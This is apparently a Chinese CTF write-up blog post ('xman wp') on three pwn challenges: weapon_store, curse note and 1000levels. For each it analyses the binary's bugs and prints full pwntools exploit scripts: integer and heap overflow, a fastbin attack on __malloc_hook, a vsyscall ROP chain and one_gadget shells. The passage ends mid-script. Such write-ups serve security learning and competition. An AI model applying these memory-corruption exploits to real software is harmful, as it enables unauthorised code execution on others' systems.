<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Q1IQ"><title>xman wp · Q1IQ</title><meta name="description" content="weapon_store三个功能：view、buy、checkout
view，有点想吐槽，你一个卖武器的，价目表居然跟实际价格不一样。。下面的buy功能可以看到实际价格计算方法是100 * (v3 + 1) - 29，也就是说武器1卖171，武器2卖271。371。471。。。。

buy，先计算"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Q1IQ</a></h3><div class="description"><p>北京邮电大学 天枢Dubhe</p></div></div></div><ul class="social-links"></ul><script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="footer"><a target="_blank" href="/"><span id="busuanzi_container_site_pv"></span><i class="fa fa-eye"></i>访问量<span id="busuanzi_value_site_pv"></span>次 |  <span id="busuanzi_container_site_uv"></span><i class="fa fa-user-md"></i>访客数<span id="busuanzi_value_site_uv"></span>人</a></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">Home</a></li><li><a href="/archives">Arquivo</a></li><li><a href="/links">Links</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>xman wp</a></h3></div><div class="post-content"><h3 id="weapon-store"><a href="#weapon-store" class="headerlink" title="weapon_store"></a>weapon_store</h3><p>三个功能：view、buy、checkout</p>
<p>view，有点想吐槽，你一个卖武器的，价目表居然跟实际价格不一样。。下面的buy功能可以看到实际价格计算方法是<code>100 * (v3 + 1) - 29</code>，也就是说武器1卖171，武器2卖271。371。471。。。。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102130240.png" alt=""></p>
<p>buy，先计算买的武器单价*数量是不是超过了手里的money，没超过就放到购物车里，但可以通过整数溢出绕过这个限制；另外可以看到malloc的时候还和0x1ff与了一下，可能有堆溢出。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102130115.png" alt=""></p>
<p>checkout，当手里的money少于买下所有武器要花的钱时，就给你一次堆溢出的机会，这时可以把其他武器的name改换为flag输出。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102130855.png" alt=""></p>
<p>输入选项的地方看起来可以泄露点什么出来</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191030190305.png" alt=""></p>
<p>但这个地方存放的是两个栈里的值，一个text段的值，也得不到什么信息</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191030190101.png" alt=""></p>
<p>这道题绊住我的是做法的问题，一直想的是怎么getshell。虽然data段里有<code>Flag</code>这几个大字，但谁能想到这题是让你泄露它啊。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102125812.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(<span class="string">"./weapon_store"</span>)<span class="comment">#,env=&#123;'LD_PRELOAD':'./libc-2.27.so'&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">"47.97.253.115"</span>,<span class="number">10002</span>)</span><br><span class="line">elf = ELF(<span class="string">'./weapon_store'</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x            :io.send(str(x))</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y         :io.sendafter(str(x), str(y))</span><br><span class="line">sl  = <span class="keyword">lambda</span> x      :io.sendline(str(x))</span><br><span class="line">sla  = <span class="keyword">lambda</span> x,y    :io.sendlineafter(str(x), str(y))</span><br><span class="line">r = <span class="keyword">lambda</span> x             :io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x      :io.recvuntil(x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(which,amount)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">"Which do you want to buy:"</span>)</span><br><span class="line">    sl(which)</span><br><span class="line">    ru(<span class="string">"How many do you want to buy:"</span>)</span><br><span class="line">    sl(amount)</span><br><span class="line"><span class="comment">#1 2 3 4 171 271 371 471</span></span><br><span class="line"><span class="comment">#money 0x1000 4096</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span><span class="params">()</span>:</span></span><br><span class="line">     ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">     sl(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#buy(1,1)#c0</span></span><br><span class="line">buy(<span class="number">1</span>,<span class="number">2</span>)<span class="comment">#160</span></span><br><span class="line"><span class="comment">#buy(1,3)#20</span></span><br><span class="line"><span class="comment">#buy(1,4)#c0</span></span><br><span class="line"><span class="comment">#buy(1,5)#160</span></span><br><span class="line"><span class="comment">#buy(1,6)#20</span></span><br><span class="line">buy(<span class="number">1</span>,<span class="number">2</span>)<span class="comment">#160</span></span><br><span class="line">checkout()</span><br><span class="line">buy(<span class="number">1</span>,<span class="number">9</span>)</span><br><span class="line">buy(<span class="number">1</span>,<span class="number">9</span>)</span><br><span class="line">buy(<span class="number">1</span>,<span class="number">9</span>)<span class="comment">#20</span></span><br><span class="line">buy(<span class="number">4</span>,<span class="number">0x8b2468</span>)<span class="comment">#160</span></span><br><span class="line">checkout()</span><br><span class="line">ru(<span class="string">"Do you want to remove a weapon?(y/n)\n"</span>)</span><br><span class="line">sl(<span class="string">"y"</span>)</span><br><span class="line">ru(<span class="string">'Please tell us about the reason why you are so poor:'</span>)</span><br><span class="line">s(<span class="string">"2"</span>*<span class="number">0x158</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)+p32(<span class="number">0x603</span>)+p32(<span class="number">9</span>)+p64(<span class="number">0</span>)+<span class="string">'\x20'</span>)</span><br><span class="line">checkout()</span><br><span class="line">ru(<span class="string">"3. Name:       "</span>)</span><br><span class="line">log.success(<span class="string">"flag : "</span>+ru(<span class="string">"Price:"</span>)[:<span class="number">-6</span>])</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#io.interactive()</span></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102131903.png" alt=""></p>
<h3 id="curse-note"><a href="#curse-note" class="headerlink" title="curse note"></a>curse note</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>这道题三个功能：new、show、delete，可以用三个note</p>
<p>new存在很多漏洞点：没检查分配的大小，没检查分配是不是成功，任意地址写0</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102132550.png" alt=""></p>
<p>show平平无奇</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102132752.png" alt=""></p>
<p>delete平平无奇</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102132839.png" alt=""></p>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>利用任意地址写0构造overlap然后fastbin attack，唯一的坑点在于分配大内存后，程序就不再从mainarena分配了，而是会从threadarena分配。在threadarena里，size的最后一字节为0x00000101而非0x00000001，所以构造overlap的时候，要先将preisused位置0，再分配这块，此时这块的size的最后一字节就是4了，再free掉这块就成功overlap了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	io = process(<span class="string">"./curse_note"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io =remote(<span class="string">"47.97.253.115"</span>,<span class="number">10002</span>)</span><br><span class="line">elf = ELF(<span class="string">'./curse_note'</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(str(data)) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> numb       :io.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims  :io.recvuntil(delims)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index,size,info)</span>:</span></span><br><span class="line">	ru(<span class="string">"choice: "</span>)</span><br><span class="line">	sl(<span class="string">"1"</span>)</span><br><span class="line">	ru(<span class="string">"index: "</span>)</span><br><span class="line">	sl(index)</span><br><span class="line">	ru(<span class="string">"size: "</span>)</span><br><span class="line">	sl(size)</span><br><span class="line">	ru(<span class="string">"info: "</span>)</span><br><span class="line">	s(info)  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	ru(<span class="string">"choice: "</span>)</span><br><span class="line">	sl(<span class="string">"2"</span>)</span><br><span class="line">	ru(<span class="string">"index: "</span>)</span><br><span class="line">	sl(index)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	ru(<span class="string">"choice: "</span>)</span><br><span class="line">	sl(<span class="string">"3"</span>)</span><br><span class="line">	ru(<span class="string">"index: "</span>)	</span><br><span class="line">	sl(index)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">	sl(<span class="string">"4"</span>)</span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x90</span><span class="number">-8</span>,<span class="string">"1"</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x20</span><span class="number">-8</span>,<span class="string">"1"</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x20</span><span class="number">-8</span>,<span class="string">"1"</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x90</span><span class="number">-8</span>,<span class="string">"1"</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(r(<span class="number">16</span>)[<span class="number">-8</span>:])</span><br><span class="line">libc.address=leak<span class="number">-0x3c4b78</span></span><br><span class="line">log.success(<span class="string">"libc : "</span>+hex(libc.address))</span><br><span class="line"><span class="comment">#leak heap</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x20</span><span class="number">-8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap=u64(r(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">"heap : "</span>+hex(heap))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak thread arena base</span></span><br><span class="line">new(<span class="number">0</span>,heap+<span class="number">0x11</span>,<span class="string">"a"</span>)</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">"a"</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x70</span><span class="number">-8</span>,<span class="string">"a"</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">"a"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x30</span><span class="number">-8</span>,<span class="string">"1"</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">"1"</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">thread_heap=u64(r(<span class="number">16</span>)[<span class="number">-8</span>:])<span class="number">-0x170</span></span><br><span class="line">thread_base=thread_heap<span class="number">-0x8b0</span></span><br><span class="line">log.success(<span class="string">"thread heap : "</span>+hex(thread_heap))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overlap </span></span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x70</span><span class="number">-8</span>,<span class="string">"a"</span>*(<span class="number">0x70</span><span class="number">-8</span><span class="number">-8</span>)+p64(<span class="number">0x170</span>))</span><br><span class="line">new(<span class="number">2</span>,thread_heap+<span class="number">0x178</span>+<span class="number">1</span>,<span class="string">"11111111"</span>) <span class="comment">#preused=0</span></span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">"1111111"</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fastbinattack</span></span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x270</span><span class="number">-8</span>,<span class="string">"a"</span>*(<span class="number">0x100</span><span class="number">-8</span>)+p64(<span class="number">0x75</span>)+p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x70</span><span class="number">-8</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">onegadgets=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">onegadget=libc.address+onegadgets[<span class="number">3</span>]</span><br><span class="line">c=<span class="string">"d"</span>*<span class="number">0xB</span>+p64(<span class="number">0</span>)+p64(onegadget)+<span class="string">'\x00'</span>*<span class="number">8</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x70</span><span class="number">-8</span>,c)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"choice: "</span>)</span><br><span class="line">sl(<span class="string">"1"</span>)</span><br><span class="line">ru(<span class="string">"index: "</span>)</span><br><span class="line">sl(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"size: "</span>)</span><br><span class="line">sl(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h3><p>两个功能，go和hint</p>
<p>首先看hint，hint虽然不能直接打印出system的地址，但是把system的地址放在了<code>rbp-110h</code>这个地方</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104163436.png" alt=""></p>
<p>go让你输入两个数字作为关卡数，如果俩数字之和超过了99，关卡数就被设置为100（题目难道不是叫做1000levels吗？啊？？），算对了就让你过关。可以看到v5、v6就是刚刚system所在的地方，当然要想办法把v5用起来。可以看出v2&lt;=0的时候v5没有被赋值，这样v5就被留下来了，当然留下来是有代价的，要创完100关才给你栈溢出的机会（system可在go里放着呢:P）</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104162509.png" alt=""></p>
<p>关卡里有栈溢出：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104162710.png" alt=""></p>
<h4 id="方法1-利用vsyscall构造ROP"><a href="#方法1-利用vsyscall构造ROP" class="headerlink" title="方法1-利用vsyscall构造ROP"></a>方法1-利用vsyscall构造ROP</h4><p>这题因为开了PIE，所以不知道gadget的地址，就不好构造ROP。vsyscall是一个只有ret功能的gadget，见下图（0x60是gettimeofday，不知道有啥用反正没有用），vsyscall的地址是固定的，而且我们必须跳到 vsyscall 的开头，而不能直接跳到 ret，这是内核决定的。栈中提前存好one_gadget的地址，然后构造三次ret即可。</p>
<p>![image-20191102211935780](/Users/apple/Library/Application Support/typora-user-images/image-20191102211935780.png)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">vsyscall=<span class="number">0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	io = process(<span class="string">'./100levels'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io=remote(<span class="string">"111.198.29.45"</span>,<span class="number">41268</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./100levels'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(first, more)</span>:</span></span><br><span class="line">	io.recvuntil(<span class="string">"Choice:\n"</span>)</span><br><span class="line">	io.sendline(<span class="string">'1'</span>)	</span><br><span class="line">	io.recvuntil(<span class="string">"How many levels?\n"</span>)</span><br><span class="line">	io.sendline(str(first))</span><br><span class="line">	io.recvuntil(<span class="string">"Any more?\n"</span>)</span><br><span class="line">	io.sendline(str(more))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">	io.recvuntil(<span class="string">"Choice:\n"</span>)</span><br><span class="line">	io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer</span><span class="params">()</span>:</span></span><br><span class="line">	io.recvuntil(<span class="string">"Question:"</span>)</span><br><span class="line">	num1=int(io.recv(<span class="number">3</span>))</span><br><span class="line">	io.recvuntil(<span class="string">"*"</span>)</span><br><span class="line">	num2=int(io.recv(<span class="number">3</span>))</span><br><span class="line">	io.recvuntil(<span class="string">"Answer:"</span>)</span><br><span class="line">	io.sendline(str(num1*num2))</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">hint()</span><br><span class="line">go(<span class="number">0</span>,one_gadget - system_offset)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">	answer()</span><br><span class="line">io.recvuntil(<span class="string">"Question:"</span>)</span><br><span class="line">num1=int(io.recv(<span class="number">3</span>))</span><br><span class="line">io.recvuntil(<span class="string">"*"</span>)</span><br><span class="line">num2=int(io.recv(<span class="number">3</span>))</span><br><span class="line">io.recvuntil(<span class="string">"Answer:"</span>)</span><br><span class="line">content=<span class="string">''</span></span><br><span class="line">content+=<span class="string">'c'</span>*<span class="number">48</span></span><br><span class="line">content+=<span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">content+=p64(vsyscall)*<span class="number">3</span></span><br><span class="line">io.send(content)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="方法2-爆破ebp-leak-elf"><a href="#方法2-爆破ebp-leak-elf" class="headerlink" title="方法2-爆破ebp+leak elf"></a>方法2-爆破ebp+leak elf</h4><p>可以通过溢出ebp的后一个字节使得ebp和esp相同，在输出Question那一句的时候获得leak elf的机会。</p>
<p>虽然Question的两个数字被填入了随机数，但因为esp上方存的一定是上一次调用的函数的返回地址，而且栈帧已经改为ebp和esp相同，所以可以泄露ebp-4和ebp-8泄露一个返回地址出来。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104164045.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#no aslr</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug =<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	io = process(<span class="string">'./100levels'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = remote(<span class="string">"111.198.29.45"</span>,<span class="number">44322</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./100levels'</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(str(data)) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :io.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line"></span><br><span class="line">one_gadgets_ti = [<span class="number">0x4526a</span>,<span class="number">0xef6c4</span>,<span class="number">0xf0567</span>]</span><br><span class="line">one_gadgets=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=one_gadgets_ti[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">'Choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(first,more)</span>:</span></span><br><span class="line">	ru(<span class="string">"Choice:\n"</span>)</span><br><span class="line">	sl(<span class="string">'1'</span>)	</span><br><span class="line">	ru(<span class="string">"How many 